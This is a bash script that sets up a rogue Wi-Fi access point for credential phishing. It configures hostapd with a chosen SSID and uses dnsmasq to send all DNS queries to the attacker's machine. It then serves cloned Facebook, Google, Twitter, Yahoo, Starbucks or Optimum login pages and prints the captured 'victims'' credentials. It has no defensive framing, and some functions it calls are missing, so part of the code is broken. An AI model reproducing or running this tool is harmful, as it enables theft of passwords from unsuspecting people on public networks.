#!/bin/bash

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\nExiting...\n"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find -name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3
    ifconfig wlan0mon down 2>/dev/null
    sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null
    sleep 1
    ifconfig wlan0mon up 2>/dev/null
    airmon-ng stop wlan0mon > /dev/null 2>&1
    sleep 1
    service network-manager restart
    exit 0
}

function dependencies() {
    sleep 1.5
    counter=0
    echo -e "\nChecking required programs...\n" && sleep 1
    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e "The tool $programa is installed"
            let counter+=1
        else
            echo -e "The tool $programa is not installed"
        fi
        sleep 0.4
    done

    if [ "$(echo $counter)" == "3" ]; then
        echo -e "\nStarting...\n"
        sleep 3
    else
        echo -e "It is necessary to have the tools php, dnsmasq, and hostapd installed to run this script\n"
        exit
    fi
}

function chooseSite() {
    echo -e "\nAvailable sites:"
    sites=("facebook-login" "google-login" "twitter-login" "starbucks-login" "yahoo-login" "optimumwifi")  # Add other sites as needed
    for i in "${!sites[@]}"; do
        echo -e "\t$((i+1)). ${sites[i]}"
    done

    while true; do
        echo -ne "\nEnter the number of the site you want to target: " && read site_number

        if [[ $site_number =~ ^[0-9]+$ ]] && ((site_number >= 1 && site_number <= ${#sites[@]})); then
            chosen_site=${sites[site_number-1]}
            echo -e "\nTarget site set to: $chosen_site"
            sleep 1
            break
        else
            echo -e "Invalid choice. Please enter a valid number."
        fi
    done
}

function getCredentials() {
    activeHosts=0
    while true; do
        echo -e "\nWaiting for credentials (Ctrl+C to exit)...\n"
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        echo -e "Connected victims: $activeHosts\n"
        find -name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3
        clear
    done
}

function startAttack() {
    clear
    if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\nListing available network interfaces..."
    sleep 1

    interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
    counter=1
    for i in $(cat iface); do
        printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $i
        let counter++
    done

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
    choosed_interface=$(sed ''$use_interface'q;d' iface)

    IFS=$'\n'
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel

    createpage

    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n"
    sleep 2

    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    printf "interface=%s\n" $choosed_interface > hostapd.conf
    printf "driver=nl80211\n" >> hostapd.conf
    printf "ssid=%s\n" $use_ssid >> hostapd.conf
    printf "hw_mode=g\n" >> hostapd.conf
    printf "channel=%s\n" $use_channel >> hostapd.conf
    printf "macaddr_acl=0\n" >> hostapd.conf
    printf "auth_algs=1\n" >> hostapd.conf
    printf "ignore_broadcast_ssid=0\n" >> hostapd.conf

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface
    ifconfig $choosed_interface down
    sleep 4

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
    iwconfig $choosed_interface mode monitor
    sleep 4

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface
    ifconfig $choosed_interface up
    sleep 5

    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    printf "interface=%s\n" $choosed_interface > dnsmasq.conf
    printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    printf "server=8.8.8.8\n" >> dnsmasq.conf
    printf "log-queries\n" >> dnsmasq.conf
    printf "log-dhcp\n" >> dnsmasq.conf
    printf "listen-address=127.0.0.1\n" >> dnsmasq.conf
    printf "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1

    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    sleep 1

    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5

    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
    server
}

# Function calls in the desired order
dependencies
chooseSite
getCredentials
startAttack